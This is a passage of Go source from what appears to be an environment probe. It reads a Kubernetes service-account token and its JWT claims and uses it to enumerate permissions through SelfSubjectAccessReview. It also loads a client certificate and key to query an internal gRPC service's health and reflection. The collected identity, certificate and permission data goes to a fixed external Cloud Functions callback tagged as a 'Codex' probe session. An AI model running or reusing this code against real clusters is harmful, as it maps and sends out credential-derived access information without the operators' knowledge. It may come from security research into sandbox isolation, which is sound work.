		if decodeOneJSON(versionBody, &version) {
			result.APIVersionReachable = true
			result.Major = sanitizeText(version.Major, 16)
			result.Minor = sanitizeText(version.Minor, 16)
			result.Platform = sanitizeText(version.Platform, 64)
		}
	}
	for _, permission := range kubePermissions {
		result.Checks = append(result.Checks, executeSelfSubjectAccessReview(client, baseURL, token, namespace, permission))
	}
}

func executeSelfSubjectAccessReview(client *http.Client, baseURL, token, namespace string, permission kubePermission) kubePermissionResult {
	result := kubePermissionResult{ID: permission.ID}
	requestValue := selfSubjectAccessReview{APIVersion: "authorization.k8s.io/v1", Kind: "SelfSubjectAccessReview"}
	requestValue.Spec.ResourceAttributes = resourceAttributes{
		Verb: permission.Verb, Group: permission.Group, Resource: permission.Resource, Subresource: permission.Subresource,
	}
	if permission.Namespaced {
		requestValue.Spec.ResourceAttributes.Namespace = namespace
	}
	body, err := json.Marshal(requestValue)
	if err != nil || len(body) > 4096 {
		return result
	}
	responseBody, status, err := authenticatedJSON(client, http.MethodPost, baseURL+"/apis/authorization.k8s.io/v1/selfsubjectaccessreviews", token, body, 32*1024)
	result.HTTPStatus = status
	if err != nil || (status != http.StatusOK && status != http.StatusCreated) {
		return result
	}
	var response selfSubjectAccessReview
	if !decodeOneJSON(responseBody, &response) || response.APIVersion != requestValue.APIVersion || response.Kind != requestValue.Kind || response.Spec.ResourceAttributes != requestValue.Spec.ResourceAttributes {
		return result
	}
	result.ValidResponse = true
	result.Allowed = response.Status.Allowed
	result.Denied = response.Status.Denied
	result.EvaluationErrorPresent = response.Status.EvaluationError != ""
	return result
}

func authenticatedJSON(client *http.Client, method, endpoint, token string, body []byte, maximum int64) ([]byte, int, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, method, endpoint, bytes.NewReader(body))
	if err != nil {
		return nil, 0, err
	}
	request.Header.Set("Authorization", "Bearer "+token)
	request.Header.Set("Accept", "application/json")
	request.Header.Set("User-Agent", expectedAgent)
	if body != nil {
		request.Header.Set("Content-Type", "application/json")
	}
	response, err := client.Do(request)
	if err != nil {
		return nil, 0, err
	}
	defer response.Body.Close()
	responseBody, err := readBoundedReader(response.Body, maximum)
	if err != nil {
		return nil, response.StatusCode, err
	}
	if !isJSONContentType(response.Header.Get("Content-Type")) {
		return nil, response.StatusCode, errors.New("unexpected content type")
	}
	return responseBody, response.StatusCode, nil
}

func safeJWTClaims(token []byte) map[string]any {
	parts := strings.Split(string(token), ".")
	if len(parts) != 3 || len(parts[1]) > 32*1024 {
		return nil
	}
	payload, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil || len(payload) > 24*1024 {
		return nil
	}
	decoder := json.NewDecoder(bytes.NewReader(payload))
	decoder.UseNumber()
	var claims map[string]any
	if decoder.Decode(&claims) != nil {
		return nil
	}
	result := map[string]any{}
	for _, key := range []string{"sub", "iss"} {
		if value, ok := claims[key].(string); ok && len(value) <= 512 {
			result[key] = sanitizeText(value, 512)
		}
	}
	if value, ok := claims["exp"].(json.Number); ok {
		if expiry, parseErr := value.Int64(); parseErr == nil && expiry > 0 {
			result["exp"] = expiry
		}
	}
	result["aud"] = safeAudience(claims["aud"])
	if kubernetes, ok := claims["kubernetes.io"].(map[string]any); ok {
		if namespace, ok := kubernetes["namespace"].(string); ok && validNamespace(namespace) {
			result["namespace"] = namespace
		}
		if pod, ok := kubernetes["pod"].(map[string]any); ok {
			podResult := map[string]string{}
			for _, key := range []string{"name", "uid"} {
				if value, ok := pod[key].(string); ok && len(value) <= 256 {
					podResult[key] = sanitizeText(value, 256)
				}
			}
			if len(podResult) != 0 {
				result["pod"] = podResult
			}
		}
	}
	if len(result) == 0 {
		return nil
	}
	return result
}

func safeAudience(value any) []string {
	result := []string{}
	appendValue := func(item string) {
		if len(result) < 8 && len(item) > 0 && len(item) <= 512 {
			result = append(result, sanitizeText(item, 512))
		}
	}
	switch typed := value.(type) {
	case string:
		appendValue(typed)
	case []any:
		for _, item := range typed {
			if text, ok := item.(string); ok {
				appendValue(text)
			}
		}
	}
	return result
}

func runInternalGRPCIdentity() internalGRPCResult {
	result := internalGRPCResult{FixedServices: fixedServiceMap()}
	certificatePEM, err := readBoundedCredential(clientCertificate)
	if err != nil {
		result.Error = "client_certificate_unavailable"
		return result
	}
	defer clearBytes(certificatePEM)
	keyPEM, err := readBoundedCredential(clientKey)
	if err != nil {
		result.Error = "client_key_unavailable"
		return result
	}
	defer clearBytes(keyPEM)
	poolPEM, err := readBoundedCredential(serverPool)
	if err != nil {
		result.Error = "server_pool_unavailable"
		return result
	}
	defer clearBytes(poolPEM)
	certificate, err := tls.X509KeyPair(certificatePEM, keyPEM)
	if err != nil || len(certificate.Certificate) == 0 {
		result.Error = "client_identity_invalid"
		return result
	}
	leaf, err := x509.ParseCertificate(certificate.Certificate[0])
	if err != nil {
		result.Error = "client_leaf_invalid"
		return result
	}
	result.Certificate = summarizeCertificate(leaf)
	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(poolPEM) {
		result.Error = "server_pool_invalid"
		return result
	}
	transport := &http.Transport{
		Proxy: nil,
		TLSClientConfig: &tls.Config{
			MinVersion: tls.VersionTLS12, RootCAs: pool,
			Certificates: []tls.Certificate{certificate}, ServerName: internalServerName,
		},
		DialContext:       (&net.Dialer{Timeout: 3 * time.Second, KeepAlive: -1}).DialContext,
		DisableKeepAlives: true, ForceAttemptHTTP2: true,
		TLSHandshakeTimeout: 3 * time.Second, ResponseHeaderTimeout: 4 * time.Second,
	}
	defer transport.CloseIdleConnections()
	client := &http.Client{Transport: transport, Timeout: 5 * time.Second, CheckRedirect: rejectRedirect}
	result.CredentialFilesPresent = true
	executeInternalGRPCChecks(client, "https://"+internalGRPCAddress, &result)
	return result
}

func summarizeCertificate(certificate *x509.Certificate) certificateIdentity {
	digest := sha256.Sum256(certificate.Raw)
	result := certificateIdentity{
		Subject:   sanitizeText(certificate.Subject.String(), 512),
		Issuer:    sanitizeText(certificate.Issuer.String(), 512),
		NotBefore: certificate.NotBefore.UTC().Format(time.RFC3339),
		NotAfter:  certificate.NotAfter.UTC().Format(time.RFC3339),
		SHA256:    hex.EncodeToString(digest[:]),
		DNSNames:  []string{},
	}
	for _, name := range certificate.DNSNames {
		if len(result.DNSNames) == 16 {
			break
		}
		result.DNSNames = append(result.DNSNames, sanitizeText(name, 256))
	}
	return result
}

func executeInternalGRPCChecks(client *http.Client, baseURL string, result *internalGRPCResult) {
	var healthFrames [][]byte
	result.Health, healthFrames = executeGRPCCall(client, baseURL, healthMethod, []byte{0x0a, 0x00})
	if result.Health.ValidResponse && len(healthFrames) == 1 {
		if status, ok := firstVarintField(healthFrames[0], 1); ok {
			switch status {
			case 1:
				result.HealthStatus = "SERVING"
			case 2:
				result.HealthStatus = "NOT_SERVING"
			case 3:
				result.HealthStatus = "SERVICE_UNKNOWN"
			default:
				result.HealthStatus = "UNKNOWN"
			}
		}
	}
	var reflectionFrames [][]byte
	result.Reflection, reflectionFrames = executeGRPCCall(client, baseURL, reflectionMethod, []byte{0x3a, 0x00})
	if result.Reflection.ValidResponse {
		observed := reflectedServiceNames(reflectionFrames)
		for _, expected := range fixedReflectedServices {
			result.FixedServices[expected] = observed[expected]
		}
	}
}

func executeGRPCCall(client *http.Client, baseURL, method string, payload []byte) (grpcCallResult, [][]byte) {
	result := grpcCallResult{Method: method, GRPCStatus: -1}
	frame := make([]byte, 5+len(payload))
	binary.BigEndian.PutUint32(frame[1:5], uint32(len(payload)))
	copy(frame[5:], payload)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPost, baseURL+method, bytes.NewReader(frame))
	if err != nil {
		result.Error = "request_create_failed"
		return result, nil
	}
	request.Header.Set("Content-Type", "application/grpc")
	request.Header.Set("TE", "trailers")
	request.Header.Set("User-Agent", expectedAgent)
	response, err := client.Do(request)
	if err != nil {
		result.Error = "request_failed"
		return result, nil
	}
	defer response.Body.Close()
	result.TLSConnected = response.TLS != nil && response.TLS.HandshakeComplete
	result.HTTPStatus = response.StatusCode
	body, err := readBoundedReader(response.Body, maximumGRPCBody)
	if err != nil {
		result.Error = "response_oversize"
		return result, nil
	}
	frames, payloadBytes, err := parseGRPCFrames(body, 16)
	result.ResponseFrames = len(frames)
	result.ResponsePayloadBytes = payloadBytes
	result.GRPCStatus = parseGRPCStatus(response.Header, response.Trailer)
	if err != nil {
		result.Error = "response_frame_invalid"
		return result, nil
	}
	if response.StatusCode != http.StatusOK || !isGRPCContentType(response.Header.Get("Content-Type")) {
		result.Error = "response_protocol_invalid"
		return result, frames
	}
	if result.GRPCStatus != 0 {
		result.Error = "grpc_status_nonzero"
		return result, frames
	}
	result.ValidResponse = true
	return result, frames
}

func parseGRPCFrames(body []byte, maximumFrames int) ([][]byte, int, error) {
	frames := [][]byte{}
	payloadBytes := 0
	for offset := 0; offset < len(body); {
		if len(body)-offset < 5 || body[offset] != 0 || len(frames) >= maximumFrames {
			return nil, 0, errors.New("invalid frame")
		}
		length := int(binary.BigEndian.Uint32(body[offset+1 : offset+5]))
		offset += 5
		if length < 0 || length > maximumGRPCBody || length > len(body)-offset {
			return nil, 0, errors.New("invalid frame length")
		}
		frames = append(frames, append([]byte(nil), body[offset:offset+length]...))
		payloadBytes += length
		offset += length
	}
	return frames, payloadBytes, nil
}

func reflectedServiceNames(frames [][]byte) map[string]bool {
	result := map[string]bool{}
	for _, frame := range frames {
		for _, responseField := range protobufFields(frame) {
			if responseField.number != 6 || responseField.wire != 2 {
				continue
			}
			for _, serviceField := range protobufFields(responseField.bytes) {
				if serviceField.number != 1 || serviceField.wire != 2 {
					continue
				}
				for _, nameField := range protobufFields(serviceField.bytes) {
					if nameField.number != 1 || nameField.wire != 2 || len(nameField.bytes) > 256 {
						continue
					}
					name := string(nameField.bytes)
					for _, expected := range fixedReflectedServices {
						if name == expected {
							result[expected] = true
						}
					}
				}
			}
		}
	}
	return result
}

func protobufFields(data []byte) []protobufField {
	result := []protobufField{}
	for offset := 0; offset < len(data); {
		key, size := binary.Uvarint(data[offset:])
		if size <= 0 {
			return nil
		}
		offset += size
		field := protobufField{number: int(key >> 3), wire: int(key & 7)}
		if field.number <= 0 {
			return nil
		}
		switch field.wire {
		case 0:
			value, valueSize := binary.Uvarint(data[offset:])
			if valueSize <= 0 {
				return nil
			}
			field.varint = value
			offset += valueSize
		case 2:
			length, lengthSize := binary.Uvarint(data[offset:])
			if lengthSize <= 0 || length > uint64(len(data)) {
				return nil
			}
			offset += lengthSize
			if length > uint64(len(data)-offset) {
				return nil
			}
			field.bytes = data[offset : offset+int(length)]
			offset += int(length)
		default:
			return nil
		}
		result = append(result, field)
	}
	return result
}

func firstVarintField(data []byte, number int) (uint64, bool) {
	for _, field := range protobufFields(data) {
		if field.number == number && field.wire == 0 {
			return field.varint, true
		}
	}
	return 0, false
}

func parseGRPCStatus(header, trailer http.Header) int {
	value := trailer.Get("Grpc-Status")
	if value == "" {
		value = header.Get("Grpc-Status")
	}
	status, err := strconv.Atoi(value)
	if err != nil || status < 0 || status > 16 {
		return -1
	}
	return status
}

func fixedServiceMap() map[string]bool {
	result := map[string]bool{}
	for _, service := range fixedReflectedServices {
		result[service] = false
	}
	return result
}

func readBoundedCredential(path string) ([]byte, error) {
	info, err := os.Stat(path)
	if err != nil || !info.Mode().IsRegular() || info.Size() < 1 || info.Size() > maximumCredential {
		return nil, errors.New("credential unavailable")
	}
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	return readBoundedReader(file, maximumCredential)
}

func readBoundedReader(reader io.Reader, maximum int64) ([]byte, error) {
	value, err := io.ReadAll(io.LimitReader(reader, maximum+1))
	if err != nil || int64(len(value)) > maximum {
		return nil, errors.New("bounded read failed")
	}
	return value, nil
}

func clearBytes(value []byte) {
	for index := range value {
		value[index] = 0
	}
}

func validNamespace(value string) bool {
	if len(value) < 1 || len(value) > 63 || value[0] == '-' || value[len(value)-1] == '-' {
		return false
	}
	for _, character := range value {
		if (character < 'a' || character > 'z') && (character < '0' || character > '9') && character != '-' {
			return false
		}
	}
	return true
}

func rejectRedirect(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse }

func isJSONContentType(value string) bool {
	mediaType, _, err := mime.ParseMediaType(value)
	return err == nil && mediaType == "application/json"
}

func isGRPCContentType(value string) bool {
	mediaType, _, err := mime.ParseMediaType(value)
	return err == nil && strings.HasPrefix(mediaType, "application/grpc")
}

func decodeOneJSON(data []byte, target any) bool {
	decoder := json.NewDecoder(bytes.NewReader(data))
	if decoder.Decode(target) != nil {
		return false
	}
	var extra any
	return errors.Is(decoder.Decode(&extra), io.EOF)
}

func call(method, suffix string, value any) (int, []byte, error) {
	body, err := json.Marshal(value)
	if err != nil || len(body) > maximumBody {
		return 0, nil, errors.New("invalid request body")
	}
	ctx, cancel := context.WithTimeout(context.Background(), httpTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, method, callbackURL+"/"+suffix, bytes.NewReader(body))
	if err != nil {
		return 0, nil, err
	}
	request.Header.Set("User-Agent", expectedAgent)
	request.Header.Set("X-Codex-Probe-Session", callbackSession)
	request.Header.Set("Content-Type", "application/json")
	dialer := &net.Dialer{Timeout: 10 * time.Second, KeepAlive: -1}
	transport := &http.Transport{
		Proxy: nil, DialContext: dialer.DialContext, ForceAttemptHTTP2: true,
		DisableKeepAlives: true, TLSHandshakeTimeout: 10 * time.Second, ResponseHeaderTimeout: 10 * time.Second,
	}
	defer transport.CloseIdleConnections()
	client := &http.Client{
		Transport: transport, Timeout: httpTimeout,
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
	}
	response, err := client.Do(request)
	if err != nil {
		return 0, nil, err
	}
	defer response.Body.Close()
	responseBody, err := io.ReadAll(io.LimitReader(response.Body, maximumBody+1))
	if err != nil || len(responseBody) > maximumBody {
		return response.StatusCode, nil, errors.New("invalid response body")
	}
	return response.StatusCode, responseBody, nil
}

func validNonce(value string) bool {
	if len(value) != 64 {
		return false
	}
	for _, character := range value {
		if (character < '0' || character > '9') && (character < 'a' || character > 'f') {
			return false
		}
	}
	return true
}

func validateRuntimeConfiguration() error {
	if !validNonce(callbackSession) || len(callbackURLSHA256) != 64 {
		return errors.New("invalid fixed callback identity")
	}
	parsed, err := url.Parse(callbackURL)
	if err != nil || parsed.Scheme != "https" || parsed.Host != "us-central1-s0victim-44547.cloudfunctions.net" ||
		parsed.User != nil || parsed.Opaque != "" || parsed.RawQuery != "" || parsed.Fragment != "" ||
		parsed.Path != "/go-cgo-v120-identity-codex/v1/session/"+callbackSession {
		return errors.New("invalid fixed callback URL")
	}
	digest := sha256.Sum256([]byte(callbackURL))
	if hex.EncodeToString(digest[:]) != callbackURLSHA256 {
		return errors.New("fixed callback digest mismatch")
	}
	return nil
}
